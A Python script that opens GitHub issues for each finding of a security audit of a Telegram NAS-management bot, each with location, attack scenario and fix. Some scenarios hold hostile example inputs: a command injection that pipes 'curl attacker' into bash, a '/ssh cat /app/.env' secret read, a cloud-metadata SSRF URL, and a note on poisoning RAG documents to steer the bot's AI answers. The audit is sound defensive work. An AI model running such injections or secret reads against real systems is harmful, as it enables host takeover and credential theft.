#!/usr/bin/env python3
"""Create GitHub issues from security audit (one ticket per finding)."""

import subprocess
import time

REPO = "danuja01/AI-NAS-TELEGRAM-BOT"
# Token cannot create custom labels; use bug + severity in title
DEFAULT_LABELS = ["bug"]

ISSUES = [
    # --- Critical ---
    {
        "severity": "critical",
        "title": "Container over-privilege enables host/Docker takeover",
        "location": "`docker-compose.yml` (lines 8–9, 59–60), `services/host_runner.py`, `config.py` (`HOST_EXEC_MODE`)",
        "explanation": "Container runs `privileged: true`, `pid: host`, mounts `/var/run/docker.sock`, and defaults to `HOST_EXEC_MODE=nsenter` to execute commands in the host mount namespace.",
        "scenario": "Any code execution inside the container (dependency RCE, compromised package) or any authorized Telegram user abusing bot features can control the Docker daemon and NAS host (start privileged containers, modify host files, etc.).",
        "fix": "Remove `privileged` and Docker socket unless strictly required; use a minimal host sidecar API with strong auth; default `HOST_EXEC_MODE=none`; run as non-root with dropped capabilities; never mount `docker.sock` into the bot container.",
    },
    {
        "severity": "critical",
        "title": "/ssh uses shell=True — arbitrary command execution",
        "location": "`commands/root_cmds.py` — `run_ssh_command()` (lines 193–217)",
        "explanation": "User-controlled command strings are passed to `asyncio.create_subprocess_shell(..., shell=True)` with no allowlist.",
        "scenario": "User with active root session runs `/ssh '; curl attacker | bash; #'` or reads secrets (`cat /app/.env`), attacks host via `nsenter`, or pivots through mounted NAS paths.",
        "fix": "Treat as break-glass only: remove in production, or replace with a fixed allowlist and `execve` without shell; separate audit log; deny shell metacharacters (`;`, `|`, `$()`, etc.).",
    },
    {
        "severity": "critical",
        "title": "SSH follow-up bypasses root session check",
        "location": "`commands/text_followup.py` (lines 82–83); `commands/root_cmds.py` — `run_ssh_command()`",
        "explanation": "`ssh_command()` checks `RootSessionManager.is_root_session_active()`, but `text_followup` calls `run_ssh_command()` directly and `run_ssh_command` never re-checks. `rootlogout` does not clear pending follow-up state (`utils/followup_state.py`).",
        "scenario": "1) `/rootlogin` → 2) `/ssh` (no args) → 3) `/rootlogout` → 4) send shell command as follow-up → shell runs without active root session.",
        "fix": "Enforce `is_root_session_active()` inside `run_ssh_command()`; clear all follow-ups on `rootlogout`.",
    },
    {
        "severity": "critical",
        "title": "Bot allows any Telegram user when ALLOWED_USER_IDS is empty",
        "location": "`utils/security.py` — `require_auth` (lines 36–39); `config.py` — `validate_config()` (lines 168–169); `commands/text_followup.py` (lines 40–41)",
        "explanation": "If `ALLOWED_USER_IDS` is unset, `require_auth` allows everyone (log warning only). Startup does not fail.",
        "scenario": "Misconfigured deploy → anyone who finds the bot can run monitoring, Docker, file, AI, and (with password) root commands.",
        "fix": "Fail fast at startup if `ALLOWED_USER_IDS` is empty; never allow open mode in production.",
    },
    {
        "severity": "critical",
        "title": "Callback handlers missing ALLOWED_USER_IDS authorization",
        "location": "`commands/service.py` — `handle_confirmation()`; `commands/docker_cmds.py` — `handle_docker_confirmation()`; `commands/operations.py` — `handle_operations_callback()` (partial)",
        "explanation": "Inline-button callbacks run reboot, shutdown, systemctl restart, and Docker stop/restart without verifying the user is in `ALLOWED_USER_IDS`.",
        "scenario": "In a group chat, another member clicks confirmation buttons; or unauthorized users trigger destructive callbacks.",
        "fix": "Verify `update.effective_user.id in config.ALLOWED_USER_IDS` in every callback; bind callback data to `user_id`; prefer private chats only.",
    },
    # --- High ---
    {
        "severity": "high",
        "title": "Weak ROOT_PASSWORD authentication (plaintext, no lockout)",
        "location": "`utils/root_session.py` (lines 55–56); `config.py` (line 56)",
        "explanation": "Plaintext compare to env var; no rate limiting on `/rootlogin`; unused `_hash_password()`; no bcrypt as documented.",
        "scenario": "Brute-force `/rootlogin` within global rate limit; stolen `.env` grants full filesystem + `/ssh`.",
        "fix": "Use bcrypt/argon2; per-user lockout after N failures; rotate credentials; long random passwords.",
    },
    {
        "severity": "high",
        "title": "Root session grants filesystem access to entire /",
        "location": "`utils/root_session.py` — `get_allowed_paths_for_user()`; `utils/security.py` — `validate_path()` (lines 134–137)",
        "explanation": "Active root session sets allowed paths to `[\"/\"]`, bypassing `ALLOWED_PATHS`.",
        "scenario": "Compromised Telegram account + root password → read/write anywhere mounted in container.",
        "fix": "Narrow elevated scope; step-up confirmation for sensitive paths.",
    },
    {
        "severity": "high",
        "title": "Secrets exposed inside container via .env mount",
        "location": "`docker-compose.yml` (lines 12–21, 62); `config.py`; `ai/gpt_client.py`",
        "explanation": "All secrets in process memory; `.env` bind-mounted at `/app/.env:ro` (readable after RCE or `/ssh`).",
        "scenario": "`/ssh cat /app/.env` exfiltrates TELEGRAM_TOKEN, OPENAI_API_KEY, ROOT_PASSWORD, etc.",
        "fix": "Docker secrets / env injection without file mount; minimal secret set; rotate after incident.",
    },
    {
        "severity": "high",
        "title": "Path traversal on file upload",
        "location": "`commands/filesystem.py` — `_process_file_upload()` (lines 517–528)",
        "explanation": "`subfolder` and `filename` joined without sanitization; `sanitize_filename()` imported but unused.",
        "scenario": "Root session + `/uploadfile` with `../../data` writes outside `/app/documents`.",
        "fix": "`Path.resolve()` and enforce under `DOCUMENT_PATH`; strip `..`; sanitize all path components.",
    },
    {
        "severity": "high",
        "title": "Sensitive data stored in logs and SQLite command history",
        "location": "`commands/root_cmds.py` (line 203); `database/memory.py` — `save_command()`",
        "explanation": "Full `/ssh` commands logged at WARNING and stored in `command_history.command`.",
        "scenario": "DB backup or log leak exposes credentials typed in shell commands.",
        "fix": "Redact command bodies in logs/DB; store command type only.",
    },
    {
        "severity": "high",
        "title": "Root password sent through Telegram chat",
        "location": "`commands/root_cmds.py` — `/rootlogin` and follow-up flow",
        "explanation": "Passwords sent as chat text; message deletion is best-effort and often fails in groups.",
        "scenario": "Password retained in Telegram history, notifications, or visible in groups.",
        "fix": "No password-in-chat; out-of-band auth or long-lived tokens bound to user ID.",
    },
    {
        "severity": "high",
        "title": "Deploy pipeline uses SSH StrictHostKeyChecking=accept-new",
        "location": "`.github/workflows/deploy-nas.yml` (lines 83–85); `services/host_runner.py` (line 57)",
        "explanation": "First-connect accepts unknown host keys (MITM risk).",
        "scenario": "Attacker on path impersonates NAS during first deploy or SSH session.",
        "fix": "Pin host keys in CI secrets; use `StrictHostKeyChecking=yes` with known_hosts file.",
    },
    {
        "severity": "high",
        "title": "Cron notify HTTP hook lacks rate limiting and hardening",
        "location": "`monitoring/cron_notify_server.py`; `config.py` (`CRON_NOTIFY_*`)",
        "explanation": "Single shared secret; no rate limiting; non-timing-safe compare; health endpoint unauthenticated; mis-bound address exposes port.",
        "scenario": "LAN attacker brute-forces secret or spams fake job notifications.",
        "fix": "Bind 127.0.0.1 only; `hmac.compare_digest`; rate limit; long random secret.",
    },
    {
        "severity": "high",
        "title": "SQLite WAL/SHM files tracked in git repository",
        "location": "`data/bot.db-shm`, `data/bot.db-wal` (tracked); `.gitignore`",
        "explanation": "DB auxiliary files committed; WAL can contain conversation/command data.",
        "scenario": "Repository leak exposes operational history from a real deployment.",
        "fix": "Remove from git history; `git rm --cached`; never commit `data/*`.",
    },
    # --- Medium ---
    {
        "severity": "medium",
        "title": "Docker socket mount grants control of all host containers",
        "location": "`docker-compose.yml` (line 60); `services/docker_service.py`",
        "explanation": "Docker socket API is equivalent to root for container operations.",
        "scenario": "Authorized user stops critical containers or starts malicious privileged containers.",
        "fix": "Docker Socket Proxy with ACL; restrict API endpoints.",
    },
    {
        "severity": "medium",
        "title": "restart_service() has no systemd unit allowlist",
        "location": "`services/service_manager.py`; `commands/service.py` callbacks",
        "explanation": "Arbitrary `systemctl restart <name>` from callback after UI confirmation only.",
        "scenario": "User restarts unexpected units causing denial of service.",
        "fix": "Allowlist units similar to `host_runner._validate_unit`.",
    },
    {
        "severity": "medium",
        "title": "Rate limiting is in-memory only",
        "location": "`utils/security.py` — `rate_limit_storage`",
        "explanation": "Per-process deque; resets on restart; not shared across replicas; shared bucket for all commands.",
        "scenario": "Password spray within limits; container restart resets counters.",
        "fix": "Per-command limits; persistent backing store; backoff on auth failures.",
    },
    {
        "severity": "medium",
        "title": "Telegram Markdown used for untrusted dynamic content",
        "location": "Multiple handlers (`parse_mode='Markdown'`); e.g. `commands/root_cmds.py`, `commands/docker_cmds.py`",
        "explanation": "Filenames, paths, logs embedded without systematic escaping.",
        "scenario": "Malformed entities or misleading display (integrity/phishing in client).",
        "fix": "Use HTML mode + `escape_telegram_html()` for all dynamic content.",
    },
    {
        "severity": "medium",
        "title": "Security helpers sanitize_input and is_safe_command are unused",
        "location": "`utils/security.py`",
        "explanation": "Documented mitigations are dead code; false sense of safety in reviews.",
        "scenario": "Reviewers assume input sanitization exists; it is never applied.",
        "fix": "Wire up where needed or remove to avoid confusion.",
    },
    {
        "severity": "medium",
        "title": "Hardcoded deployment disk paths in source",
        "location": "`config.py` (lines 52–53); `docker-compose.yml` (line 58)",
        "explanation": "Specific disk UUID path hardcoded in repo.",
        "scenario": "Information disclosure aids targeted attacks on known layouts.",
        "fix": "Environment-only configuration; no machine-specific paths in source.",
    },
    {
        "severity": "medium",
        "title": "docker-run.sh security profile differs from docker-compose.yml",
        "location": "`docker-run.sh` vs `docker-compose.yml`",
        "explanation": "Quick-start script omits privileged/pid host/docker.sock; different threat model than production.",
        "scenario": "Operators assume script matches production security posture.",
        "fix": "Document single supported deploy path; align scripts or mark dev-only.",
    },
    {
        "severity": "medium",
        "title": "Dependency vulnerabilities (aiohttp, python-dotenv, transformers)",
        "location": "`requirements.txt` — `aiohttp==3.9.3`, `python-dotenv==1.0.1`, transitive transformers",
        "explanation": "pip-audit reported 24 known issues on pinned/transitive packages.",
        "scenario": "Malicious HTTP responses via search/Ollama paths trigger known client flaws.",
        "fix": "Upgrade aiohttp (≥3.13.4), python-dotenv (≥1.2.2); bump sentence-transformers stack; re-run pip-audit.",
    },
    {
        "severity": "medium",
        "title": "Deploy workflow actor gate may be insufficient for org repos",
        "location": "`.github/workflows/deploy-nas.yml` (line 57)",
        "explanation": "`github.actor == github.repository_owner` may not restrict org members with push access.",
        "scenario": "Unauthorized org member triggers deploy to NAS on push to main.",
        "fix": "GitHub Environments with required reviewers; scoped deploy keys.",
    },
    # --- Low ---
    {
        "severity": "low",
        "title": "Full exception traces logged may leak sensitive context",
        "location": "`bot.py` — `error_handler`; various `exc_info=True` log calls",
        "explanation": "Generic user message but detailed traces in log files accessible on NAS.",
        "scenario": "Log file read exposes internal paths, tokens in exception messages, or stack context.",
        "fix": "Restrict log file permissions; sanitize exception logging in production.",
    },
    {
        "severity": "low",
        "title": "notify_telegram.sh sources full .env into shell",
        "location": "`scripts/notify_telegram.sh` (lines 12–16)",
        "explanation": "Host cron script loads bot `.env`; token visible in shell environment.",
        "scenario": "Other processes/users on host read environment or script leaks creds.",
        "fix": "Dedicated minimal creds file with chmod 600.",
    },
    {
        "severity": "low",
        "title": "Dockerfile runs container as root by default",
        "location": "`Dockerfile`",
        "explanation": "No `USER` directive; combined with privileged compose, impact is maximal.",
        "scenario": "Container escape or RCE runs as root inside container namespace.",
        "fix": "Non-root USER where compatible with deployment model.",
    },
    {
        "severity": "low",
        "title": "Dockerfile EXPOSE 8080 is misleading",
        "location": "`Dockerfile` (line 40)",
        "explanation": "EXPOSE 8080 but no listener; actual HTTP is cron hook on 127.0.0.1:18765.",
        "scenario": "Misconfigured firewall/port mapping exposes wrong expectations.",
        "fix": "Remove EXPOSE 8080 or document actual ports.",
    },
    # --- Potential risk ---
    {
        "severity": "potential-risk",
        "title": "RAG / prompt injection via uploaded documents",
        "location": "`ai/rag_engine.py`; `commands/filesystem.py` uploads; `/index`",
        "explanation": "Malicious documents indexed into Chroma can poison GPT answers (uncertain direct RCE).",
        "scenario": "Attacker with upload/index path plants misleading or exfiltration-oriented content in RAG context.",
        "fix": "Validate document sources; sandbox indexing; monitor for anomalous chunks.",
    },
    {
        "severity": "potential-risk",
        "title": "SSRF risk if OLLAMA_URL points to internal services",
        "location": "`ai/ollama_client.py`; `config.py` — `OLLAMA_URL`",
        "explanation": "Bot POSTs to configurable URL; misconfiguration could target internal IPs.",
        "scenario": "Env set to `http://169.254.169.254/` or internal admin APIs (requires misconfig or env compromise).",
        "fix": "Allowlist Ollama host; block private IP ranges in URL validation.",
    },
    {
        "severity": "potential-risk",
        "title": "Bot commands registered for all group chats",
        "location": "`bot.py` — `BotCommandScopeAllGroupChats`",
        "explanation": "Command menu exposed in groups increases attack surface if bot is added to groups.",
        "scenario": "Group members discover admin commands; combined with missing callback auth increases risk.",
        "fix": "Disable group scopes or restrict bot to private chats only.",
    },
    {
        "severity": "potential-risk",
        "title": "Pinned ChromaDB 0.4.22 may have unpatched transitive CVEs",
        "location": "`requirements.txt`; `ai/rag_engine.py`",
        "explanation": "Old pinned version; full transitive audit not exhaustively verified in audit.",
        "scenario": "Unknown vulnerabilities in chromadb or dependencies (requires further pip-audit scope).",
        "fix": "Run full dependency audit; plan upgrade path with regression tests.",
    },
    {
        "severity": "potential-risk",
        "title": "MAINTENANCE_ALLOWED_USER_IDS falls back to all ALLOWED_USER_IDS",
        "location": "`commands/operations.py` — `_maintenance_user_ids()`",
        "explanation": "Empty maintenance list allows any allowed user to confirm `omv-upgrade`.",
        "scenario": "Any authorized operator runs host upgrade without separate maintenance role.",
        "fix": "Require explicit MAINTENANCE_ALLOWED_USER_IDS for destructive host operations.",
    },
    {
        "severity": "potential-risk",
        "title": "Telegram account compromise equals full NAS bot control",
        "location": "Architecture / Telegram auth model",
        "explanation": "No additional MFA layer in bot; authorization is Telegram user ID only.",
        "scenario": "Stolen phone/session gives full bot capabilities including root if password known.",
        "fix": "Document threat model; consider hardware keys, IP allowlists, or separate approval channel.",
    },
]


def body(issue: dict) -> str:
    sev = issue["severity"].replace("-", " ").title()
    return f"""## Severity
{sev}

## Location
{issue["location"]}

## Explanation
{issue["explanation"]}

## Realistic attack scenario
{issue["scenario"]}

## Recommended fix
{issue["fix"]}

---
*Automated security audit ticket. Add labels `critical` / `high` / `medium` / `low` / `potential-risk` if repo labels are configured.*
"""


def main():
    created = []
    errors = []
    prefix_map = {
        "critical": "Critical",
        "high": "High",
        "medium": "Medium",
        "low": "Low",
        "potential-risk": "Potential risk",
    }
    for i, issue in enumerate(ISSUES, 1):
        title = f"[{prefix_map[issue['severity']]}] {issue['title']}"
        cmd = [
            "gh",
            "issue",
            "create",
            "--repo",
            REPO,
            "--title",
            title,
            "--body",
            body(issue),
            "--label",
            *DEFAULT_LABELS,
        ]
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.returncode != 0:
            errors.append((title, r.stderr.strip()))
        else:
            url = (r.stdout or "").strip()
            created.append(url)
            print(f"[{i}/{len(ISSUES)}] {url}")
        time.sleep(0.4)
    print(f"\nCreated: {len(created)}, Failed: {len(errors)}")
    for t, e in errors:
        print(f"FAIL: {t}\n  {e}")


if __name__ == "__main__":
    main()
